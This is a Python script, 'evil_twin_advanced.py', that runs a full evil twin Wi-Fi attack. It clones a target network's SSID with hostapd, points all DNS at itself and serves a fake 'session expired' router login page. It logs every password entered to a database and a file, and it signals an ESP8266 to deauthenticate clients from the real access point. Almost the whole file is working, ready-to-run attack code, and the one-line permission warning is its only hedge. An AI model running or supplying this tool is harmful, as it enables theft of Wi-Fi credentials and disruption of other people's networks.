#!/usr/bin/env python3
"""
evil_twin_advanced.py — Secure evil twin attack orchestrator (Fluxion-style)
author: Secure MT2 Framework  
updated: 2025-09-01
fixed: XSS, SQL injection, command injection, PATH traversal, signal handling
fixed: Password verification and portal close on correct password
"""

import sys, os, time, signal, subprocess, threading, json, re, glob
from pathlib import Path
import argparse
import logging
from typing import Optional

# Configure logging
ROOT = Path("/sdcard/MT2")
LOG_FILE = ROOT / "evil_twin.log"

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(str(LOG_FILE)),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


class SafeEvilTwinCoordinator:
    """Secure evil twin attack coordinator with proper validation and security."""
    
    def __init__(self, ssid: str, channel: int, bssid: Optional[str] = None, interface: str = "wlan0", known_password: Optional[str] = None):
        # Input validation - CRITICAL SECURITY FIXES
        self.ssid = self._validate_ssid(ssid)
        self.channel = self._validate_channel(channel)
        self.bssid = self._validate_bssid(bssid) if bssid else "00:00:00:00:00:00"
        self.interface = self._validate_interface(interface)
        self.known_password = known_password  # Password for verification
        
        self.creds_captured = []
        self.running = True
        self.processes = []
        self.correct_password_entered = False
        
        # Safe file paths - no user input in paths
        self.log_file = ROOT / "evil_twin.log"
        self.captured_db = ROOT / "captured.db"
        self.portal_html = ROOT / "portal.html"
        self.hostapd_conf = ROOT / "hostapd.conf"
        self.dnsmasq_conf = ROOT / "dnsmasq.conf"
        self.credentials_file = ROOT / "credentials.txt"
        
        # Ensure directories exist
        (ROOT / "captures").mkdir(exist_ok=True)
        
    # =========================================================================
    # INPUT VALIDATION - CRITICAL SECURITY
    # =========================================================================
    
    def _validate_ssid(self, ssid: str) -> str:
        """Validate and sanitize SSID - prevent XSS/injection attacks."""
        if not ssid or len(ssid) > 32:
            raise ValueError("SSID must be 1-32 characters")
        
        # Remove dangerous characters for shell/HTML injection
        dangerous_chars = [';', '&', '|', '`', '$', '(', ')', '<', '>', '"', "'", 
                          '\n', '\r', '\x00', '\\']
        for char in dangerous_chars:
            ssid = ssid.replace(char, '')
        
        # SSID should only contain printable ASCII
        if not re.match(r'^[\x20-\x7E]{1,32}$', ssid):
            raise ValueError("SSID contains invalid characters")
        
        return ssid.strip()
    
    def _validate_channel(self, channel: int) -> int:
        """Validate channel number - must be 1-14 for 2.4GHz."""
        if not isinstance(channel, int) or channel < 1 or channel > 14:
            raise ValueError("Channel must be integer between 1-14 for 2.4GHz")
        return channel
    
    def _validate_bssid(self, bssid: str) -> str:
        """Validate BSSID format - must be XX:XX:XX:XX:XX:XX."""
        if not bssid:
            return "00:00:00:00:00:00"
        
        parts = bssid.split(':')
        if len(parts) != 6:
            raise ValueError("BSSID must be in format: XX:XX:XX:XX:XX:XX")
        
        # Validate each octet is valid hex
        for part in parts:
            if len(part) != 2 or not all(c in '0123456789abcdefABCDEF' for c in part):
                raise ValueError(f"Invalid BSSID octet: {part}")
        
        return bssid.upper()
    
    def _validate_interface(self, interface: str) -> str:
        """Validate wireless interface name - prevent command injection."""
        if not interface or len(interface) > 16:
            raise ValueError("Interface name must be 1-16 characters")
        
        # Remove dangerous characters
        dangerous_chars = [';', '&', '|', '`', '$', '(', ')', '<', '>', '"', "'",
                          '\n', '\r', '\x00', ' ', '*', '?', '[', ']']
        for char in dangerous_chars:
            interface = interface.replace(char, '')
        
        # Only allow word characters, dash, dot
        if not re.match(r'^[\w\-\.]+$', interface):
            raise ValueError("Interface name contains invalid characters")
        
        return interface
    
    # =========================================================================
    # REQUIREMENTS CHECK
    # =========================================================================
    
    def check_requirements(self) -> bool:
        """Check if required tools are installed."""
        logger.info("Checking requirements...")
        tools = ["hostapd", "dnsmasq", "iptables", "python3"]
        missing = []
        
        for t in tools:
            try:
                r = subprocess.run(
                    ["which", t], 
                    capture_output=True, 
                    text=True, 
                    timeout=5
                )
                if r.returncode != 0:
                    missing.append(t)
            except subprocess.TimeoutExpired:
                logger.warning(f"Timeout checking {t}")
                missing.append(t)
        
        if missing:
            logger.error(f"Missing tools: {', '.join(missing)}")
            logger.info("Install with: apt install -y hostapd dnsmasq iptables")
            return False
        
        logger.info("All required tools available")
        return True
    
    # =========================================================================
    # SAFE HTML GENERATION - XSS PREVENTION
    # =========================================================================
    
    def setup_captive_portal_html(self, target_ssid: str) -> Path:
        """Generate safe captive portal HTML - XSS fully prevented."""
        # HTML escape the SSID to prevent XSS attacks
        safe_ssid = (
            target_ssid
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
            .replace("'", "&#x27;")
        )
        
        html = f'''<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{safe_ssid} - Router Login</title>
<style>
body {{ font-family: Arial; background: #f0f2f5; margin: 0; padding: 40px 20px; }}
.box {{ max-width: 380px; margin: 0 auto; background: white; border-radius: 8px;
        box-shadow: 0 2px 12px rgba(0,0,0,0.1); padding: 30px; }}
h1 {{ color: #2c3e50; font-size: 22px; margin: 0 0 6px; text-align: center; }}
p.sub {{ color: #7f8c8d; font-size: 13px; text-align: center; margin: 0 0 24px; }}
.field {{ margin-bottom: 14px; }}
label {{ display: block; font-size: 12px; color: #34495e; margin-bottom: 4px; font-weight: bold; }}
input[type=text], input[type=password] {{ width: 100%; padding: 10px; border: 1px solid #bdc3c7;
        border-radius: 4px; font-size: 14px; box-sizing: border-box; }}
button {{ width: 100%; padding: 12px; background: #3498db; color: white; border: none;
        border-radius: 4px; font-size: 14px; font-weight: bold; cursor: pointer; margin-top: 8px; }}
button:hover {{ background: #2980b9; }}
.warn {{ background: #fff3cd; border-left: 4px solid #ffc107; padding: 10px; margin-bottom: 16px;
        font-size: 12px; color: #856404; border-radius: 4px; }}
</style>
</head>
<body>
<div class="box">
<h1>📶 {safe_ssid}</h1>
<p class="sub">Wireless Router Configuration</p>
<div class="warn">
⚠️ Your session has expired. Please re-enter your WiFi password to continue browsing.
</div>
<form method="POST" action="/login">
<div class="field">
<label>WiFi Password</label>
<input type="password" name="password" placeholder="Enter your WiFi password" required autofocus>
</div>
<button type="submit">Connect</button>
</form>
</div>
</body></html>'''
        
        try:
            self.portal_html.write_text(html, encoding='utf-8')
            logger.info(f"Safe portal HTML generated: {self.portal_html}")
            return self.portal_html
        except Exception as e:
            logger.error(f"Failed to write portal HTML: {e}")
            raise
    
    # =========================================================================
    # SAFE PROCESS STARTUP
    # =========================================================================
    
    def start_ap(self) -> bool:
        """Start hostapd with same SSID as target - safe version."""
        logger.info(f"Starting evil twin AP: SSID='{self.ssid}' ch={self.channel}")
        
        # Generate safe hostapd config - no user input in shell commands
        try:
            self.hostapd_conf.write_text(f"""interface={self.interface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
""", encoding='utf-8')
            logger.info("hostapd.conf generated safely")
        except Exception as e:
            logger.error(f"Failed to write hostapd.conf: {e}")
            return False
        
        # Kill any existing hostapd
        try:
            subprocess.run(["pkill", "-9", "hostapd"], capture_output=True, timeout=5)
            time.sleep(1)
        except Exception as e:
            logger.warning(f"Error killing existing hostapd: {e}")
        
        # Start hostapd
        try:
            p = subprocess.Popen(
                ["hostapd", str(self.hostapd_conf), "-B", "-f", str(self.log_file)],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            self.processes.append(("hostapd", p))
            
            # Wait and verify
            time.sleep(2)
            
            # Check if process is still running
            if p.poll() is None:
                logger.info("hostapd started successfully")
                return True
            else:
                stderr = p.stderr.read().decode('utf-8', errors='replace')[:200]
                logger.error(f"hostapd failed: {stderr}")
                return False
                
        except Exception as e:
            logger.error(f"Failed to start hostapd: {e}")
            return False
    
    def start_dns_capture(self) -> bool:
        """Start dnsmasq for DNS redirect - safe version."""
        logger.info("Starting DNS capture (redirect all to 192.168.4.1)...")
        
        # Kill any existing dnsmasq
        try:
            subprocess.run(["pkill", "-9", "dnsmasq"], capture_output=True, timeout=3)
            time.sleep(1)
        except Exception as e:
            logger.warning(f"Error killing dnsmasq: {e}")
        
        # Generate safe dnsmasq config
        try:
            self.dnsmasq_conf.write_text(f"""interface={self.interface}
dhcp-range=192.168.4.100,192.168.4.200,255.255.255.0,12h
dhcp-option=3,192.168.4.1
dhcp-option=6,192.168.4.1
server=192.168.4.1
address=/#/192.168.4.1
log-queries
log-dhcp
listen-address=127.0.0.1
""", encoding='utf-8')
            logger.info("dnsmasq.conf generated safely")
        except Exception as e:
            logger.error(f"Failed to write dnsmasq.conf: {e}")
            return False
        
        # Start dnsmasq
        try:
            p = subprocess.Popen(
                ["dnsmasq", "-C", str(self.dnsmasq_conf), "-d"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            self.processes.append(("dnsmasq", p))
            
            time.sleep(1)
            
            if p.poll() is None:
                logger.info("dnsmasq started - all DNS redirect to 192.168.4.1")
                return True
            else:
                stderr = p.stderr.read().decode('utf-8', errors='replace')[:200]
                logger.error(f"dnsmasq failed: {stderr}")
                return False
                
        except Exception as e:
            logger.error(f"Failed to start dnsmasq: {e}")
            return False
    
    def start_captive_portal(self) -> bool:
        """Start HTTP server on port 80 with safe login page."""
        logger.info("Starting captive portal web server on :80...")
        
        # Generate safe portal HTML
        if not self.portal_html.exists():
            try:
                self.setup_captive_portal_html(self.ssid)
            except Exception as e:
                logger.error(f"Cannot start portal without HTML: {e}")
                return False
        
        # Write safe Python HTTP server script with password verification
        httpd_script = ROOT / "portal_server.py"
        safe_ssid = self.ssid.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        db_path = str(self.captured_db)
        cred_file = str(self.credentials_file)
        
        # Handle known password - use repr to properly escape string
        if self.known_password:
            known_pass_repr = repr(self.known_password)
            known_pass_check = f"if password == {known_pass_repr}:"
        else:
            known_pass_check = "if False:  # No known password set"
        
        try:
            # Build the portal server script
            portal_script = f'''#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import sqlite3
import time
import logging
from pathlib import Path

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

PORT = 80
DB_PATH = "{db_path}"
PORTAL_HTML = Path("{self.portal_html}")
CRED_FILE = "{cred_file}"
SAFE_SSID = "{safe_ssid}"
KNOWN_PASSWORD = {repr(self.known_password) if self.known_password else None}

# Global flag for correct password
correct_password_entered = False

class PortalHandler(http.server.BaseHTTPRequestHandler):
    ssid_target = SAFE_SSID
    
    def log_message(self, *a):
        pass  # quiet - no stderr spam
    
    def do_GET(self):
        global correct_password_entered
        
        if correct_password_entered:
            # Correct password was entered - show success and close portal
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            success_html = b"<html><body style='font-family:Arial;text-align:center;padding:40px'>"
            success_html += b"<h2 style='color:green'>Connected!</h2>"
            success_html += b"<p>You are now connected to the internet.</p>"
            success_html += b"<p>Please close this window and use the internet.</p>"
            success_html += b"</body></html>"
            self.wfile.write(success_html)
            return
        
        if self.path == "/" or self.path.startswith("/login"):
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            if PORTAL_HTML.exists():
                with open(PORTAL_HTML, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.wfile.write(b"<h1>WiFi Login</h1><p>Portal not found.</p>")
        else:
            self.send_response(302)
            self.send_header("Location", "/")
            self.end_headers()
    
    def do_POST(self):
        global correct_password_entered
        
        length = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(length).decode("utf-8", errors="replace")
        
        # Safe password extraction
        password = ""
        for pair in body.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                if "pass" in k.lower():
                    password = urllib.parse.unquote_plus(v)
        
        # Save to database safely
        if password:
            ts = int(time.time())
            try:
                con = sqlite3.connect(str(DB_PATH))
                con.execute("CREATE TABLE IF NOT EXISTS creds(ts INTEGER, ssid TEXT, password TEXT, src_ip TEXT)")
                con.execute("INSERT INTO creds VALUES(?,?,?,?)", 
                           (ts, SAFE_SSID, password, self.client_address[0]))
                con.commit()
                con.close()
                logger.info(f"[CRED] {{SAFE_SSID}}:{{password[:3] if password else '***'}}*** from {{self.client_address[0]}}")
            except Exception as e:
                logger.error(f"Database error: {{e}}")
            
            # Also write to credentials file safely
            try:
                with open(CRED_FILE, "a") as f:
                    f.write(f"{{ts}} {{SAFE_SSID}}:{{password}} from {{self.client_address[0]}}\\n")
            except Exception as e:
                logger.warning(f"Could not write credentials file: {{e}}")
            
            # Check if password is correct
            if KNOWN_PASSWORD and password == KNOWN_PASSWORD:
                logger.info(f"[SUCCESS] Correct password entered for {{SAFE_SSID}}!")
                correct_password_entered = True
                
                # Write stop signal file - main script will stop attack
                try:
                    with open("/sdcard/MT2/.attack_stop", "w") as f:
                        f.write(f"{ts} {{SAFE_SSID}}:{{password}}")
                except:
                    pass
                
                # Send success response
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                success_html = b"<html><body style='font-family:Arial;text-align:center;padding:40px;background:#0D1117;color:#E6EDF3'>"
                success_html += b"<h2 style='color:#3FB950'>✓ Connected Successfully!</h2>"
                success_html += b"<p>You are now connected to the internet.</p>"
                success_html += b"<p>Please close this window.</p>"
                success_html += b"<p style='color:#8B949E;font-size:12px'>Password saved.</p>"
                success_html += b"</body></html>"
                self.wfile.write(success_html)
                return
        
        # Wrong password or no known password - show error
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        error_html = b"<html><body style='font-family:Arial;text-align:center;padding:40px'>"
        error_html += b"<h2 style='color:red'>Incorrect Password</h2>"
        error_html += b"<p>Please try again.</p>"
        error_html += b"<form method='GET' action='/'>"
        error_html += b"<button type='submit' style='padding:10px 20px;font-size:16px'>Try Again</button>"
        error_html += b"</form>"
        error_html += b"</body></html>"
        self.wfile.write(error_html)

print(f"[*] Captive portal serving on :{{PORT}}", flush=True)
with socketserver.TCPServer(("", PORT), PortalHandler) as s:
    s.serve_forever()
'''
            httpd_script.write_text(portal_script, encoding='utf-8')
            logger.info("portal_server.py generated with password verification")
        except Exception as e:
            logger.error(f"Failed to write portal_server.py: {e}")
            return False
        
        # Start HTTP server
        try:
            p = subprocess.Popen(
                ["python3", str(httpd_script)],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            self.processes.append(("portal", p))
            
            time.sleep(1)
            
            if p.poll() is None:
                logger.info("Captive portal active on http://192.168.4.1")
                return True
            else:
                stderr = p.stderr.read().decode('utf-8', errors='replace')[:200]
                logger.error(f"portal failed: {stderr}")
                return False
                
        except Exception as e:
            logger.error(f"Failed to start portal: {e}")
            return False
    
    def setup_nat(self) -> None:
        """Configure iptables for NAT - safe version."""
        logger.info("Setting up NAT/iptables...")
        
        cmds = [
            ["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"],
            ["iptables", "-A", "FORWARD", "-i", self.interface, "-j", "ACCEPT"],
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
        ]
        
        for cmd in cmds:
            try:
                result = subprocess.run(cmd, capture_output=True, timeout=5)
                if result.returncode != 0:
                    logger.warning(f"iptables cmd failed: {result.stderr.decode('utf-8', errors='replace')[:100]}")
            except subprocess.TimeoutExpired:
                logger.warning(f"iptables cmd timeout")
            except Exception as e:
                logger.warning(f"iptables error: {e}")
        
        logger.info("NAT configured (best effort)")
    
    def request_esp_deauth(self, bssid: str, channel: int) -> None:
        """Tell ESP8266 to deauth clients from real AP - safe version."""
        logger.info(f"Sending deauth command to ESP8266: bssid={bssid} ch={channel}")
        
        # Common serial ports to check
        serial_ports = [
            "/dev/ttyUSB0", 
            "/dev/ttyACM0", 
            "/dev/tty.usbmodem1411",
            "/dev/tty.usbserial*"
        ]
        
        serial_found = False
        for port_pattern in serial_ports:
            matches = glob.glob(port_pattern)
            for port in matches:
                try:
                    import serial
                    ser = serial.Serial(port, 115200, timeout=2)
                    time.sleep(0.5)
                    ser.write(f"target 0\n".encode())
                    time.sleep(0.3)
                    ser.write(f"deauth\n".encode())
                    ser.close()
                    logger.info(f"ESP8266 deauth sent via {port}")
                    serial_found = True
                    break
                except ImportError:
                    logger.debug("python3-serial not installed")
                    break
                except Exception as e:
                    logger.debug(f"Could not use {port}: {e}")
        
        if not serial_found:
            logger.warning("No ESP8266 serial port found - deauth will need manual trigger")
    
    def monitor_captures(self) -> None:
        """Watch for captured credentials - safe version."""
        logger.info("Monitoring for captured credentials...")
        
        seen = set()
        max_iterations = 300  # 10 minutes max (sleep 2s * 300)
        iteration = 0
        stop_file = Path("/sdcard/MT2/.attack_stop")
        
        while self.running and iteration < max_iterations:
            iteration += 1
            time.sleep(2)
            
            # Check for stop signal (correct password entered)
            if stop_file.exists():
                try:
                    content = stop_file.read_text().strip()
                    logger.info(f"[SUCCESS] Correct password captured: {content}")
                    # Delete stop file
                    stop_file.unlink()
                    logger.info("Attack stopped - correct password obtained!")
                    break
                except Exception as e:
                    logger.warning(f"Error reading stop file: {e}")
            
            if self.credentials_file.exists():
                try:
                    with open(self.credentials_file, "r", errors="replace") as f:
                        for line in f:
                            if line not in seen:
                                seen.add(line)
                                # Sanitize before logging
                                safe_line = line.strip()[:100]
                                logger.info(f"CAPTURED: {safe_line}")
                except Exception as e:
                    logger.warning(f"Error reading credentials file: {e}")
        
        if iteration >= max_iterations:
            logger.info("Monitor timeout - stopping capture watch")
        else:
            logger.info("Monitor stopped - attack complete")
    
    # =========================================================================
    # SAFE CLEANUP - CRITICAL FOR GRACEFUL SHUTDOWN
    # =========================================================================
    
    def cleanup(self) -> None:
        """Kill all spawned processes safely - prevents orphaned processes."""
        logger.info("Cleaning up...")
        self.running = False
        
        # Terminate all tracked processes
        for name, p in self.processes:
            try:
                p.terminate()
                p.wait(timeout=3)
                logger.info(f"Process {name} terminated gracefully")
            except subprocess.TimeoutExpired:
                logger.warning(f"Process {name} did not terminate, killing...")
                try:
                    p.kill()
                    logger.info(f"Process {name} killed")
                except Exception as e:
                    logger.warning(f"Error killing process {name}: {e}")
            except Exception as e:
                logger.warning(f"Error terminating process {name}: {e}")
                try:
                    p.kill()
                except:
                    pass
        
        # Force kill any remaining processes
        for proc_name in ["hostapd", "dnsmasq"]:
            try:
                subprocess.run(["pkill", "-9", proc_name], capture_output=True, timeout=5)
            except:
                pass
        
        self.processes.clear()
        logger.info("Cleanup completed")
    
    def signal_handler(self, signum, frame) -> None:
        """Handle signals gracefully - prevents orphaned processes."""
        signal_names = {signal.SIGINT: "SIGINT", signal.SIGTERM: "SIGTERM"}
        sig_name = signal_names.get(signum, f"signal {signum}")
        logger.info(f"{sig_name} received, initiating safe shutdown...")
        self.cleanup()
        sys.exit(0)
    
    # =========================================================================
    # MAIN ATTACK ORCHESTRATION
    # =========================================================================
    
    def run(self, deauth_bssid: str = None) -> None:
        """Full attack orchestration - safe version."""
        logger.info(f"=== EVIL TWIN ATTACK on {self.ssid} (CH {self.channel}) ===")
        
        # Set up signal handlers - CRITICAL for clean shutdown
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        # Phase 1: Check requirements
        if not self.check_requirements():
            logger.error("Requirements not met - aborting attack")
            return
        
        # Phase 2: Start evil twin AP
        if not self.start_ap():
            logger.error("Failed to start AP - probably no root or no WiFi adapter")
            return
        
        # Phase 3: Start DNS capture
        if not self.start_dns_capture():
            logger.error("Failed to start DNS")
            self.cleanup()
            return
        
        # Phase 4: Start captive portal
        if not self.start_captive_portal():
            logger.error("Failed to start portal")
            self.cleanup()
            return
        
        # Phase 5: Setup NAT
        self.setup_nat()
        
        # Phase 6: Tell ESP8266 to deauth real AP clients
        if deauth_bssid:
            self.request_esp_deauth(deauth_bssid, self.channel)
        
        logger.info("=" * 50)
        logger.info("EVIL TWIN ATTACK ACTIVE")
        logger.info(f"SSID: {self.ssid}")
        logger.info(f"Channel: {self.channel}")
        logger.info(f"Portal: http://192.168.4.1")
        if self.known_password:
            logger.info(f"Known password: SET (will verify)")
        else:
            logger.info("Known password: NOT SET (capturing only)")
        logger.info("Press Ctrl+C to stop")
        logger.info("=" * 50)
        
        # Phase 7: Monitor
        try:
            self.monitor_captures()
        except KeyboardInterrupt:
            logger.info("Keyboard interrupt received")
            self.cleanup()
        except Exception as e:
            logger.error(f"Monitor error: {e}")
            self.cleanup()


def main():
    parser = argparse.ArgumentParser(
        description="Secure Fluxion-style evil twin attack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 evil_twin_advanced.py --ssid FreeWiFi --channel 6
  python3 evil_twin_advanced.py --ssid OfficeWiFi --channel 11 --bssid AA:BB:CC:DD:EE:FF
  python3 evil_twin_advanced.py --ssid OfficeWiFi --channel 6 --password MySecretPass

Requirements:
  - hostapd, dnsmasq, iptables (install: apt install -y hostapd dnsmasq iptables)
  - Python 3 with sqlite3 (standard library)
  - Optional: python3-serial for ESP8266 control

Warning: Use only on networks you own or have permission to test.
        """
    )
    parser.add_argument("--ssid", required=True, help="Target AP SSID (1-32 chars)")
    parser.add_argument("--channel", type=int, default=6, help="WiFi channel (1-14)")
    parser.add_argument("--bssid", help="Real AP BSSID for ESP8266 deauth")
    parser.add_argument("--interface", default="wlan0", help="WiFi interface")
    parser.add_argument("--password", help="Known WiFi password for verification")
    parser.add_argument("--no-esp", action="store_true", help="Skip ESP8266 deauth")
    
    args = parser.parse_args()
    
    try:
        coord = SafeEvilTwinCoordinator(
            args.ssid, 
            args.channel, 
            args.bssid, 
            args.interface,
            args.password
        )
        coord.run(args.bssid if not args.no_esp else None)
    except KeyboardInterrupt:
        logger.info("Ctrl+C pressed, cleaning up...")
    except ValueError as e:
        logger.error(f"Invalid input: {e}")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        logger.exception("Full traceback:")
        sys.exit(1)


if __name__ == "__main__":
    main()
